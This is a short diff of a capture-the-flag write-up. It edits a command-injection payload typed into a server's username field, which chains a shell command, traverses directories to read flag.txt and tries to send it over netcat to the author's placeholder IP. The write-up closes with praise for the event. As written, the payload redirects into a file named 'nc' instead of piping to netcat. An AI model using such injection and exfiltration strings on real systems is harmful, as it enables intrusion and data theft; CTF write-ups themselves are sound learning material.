@@ -18,6 +18,6 @@ I realized after that revelation that the script was simply inputing the login i
 
 Laptop: `nc -l 8080 > flag.txt`
 
-Server (Username field): `a; cat ../../../../flag.txt > nc MYIP 8080`
+Server (Username field): `a; cat ../../../../flag.txt > nc MYIP 8080;`
 
 Overall I found the event to be a great experience, allowing me to see how computer security ties into real life and also providing my team and I with an amazingly fun and entertaining CTF. Thanks to everyone who organized it and I can't wait to attend next year!
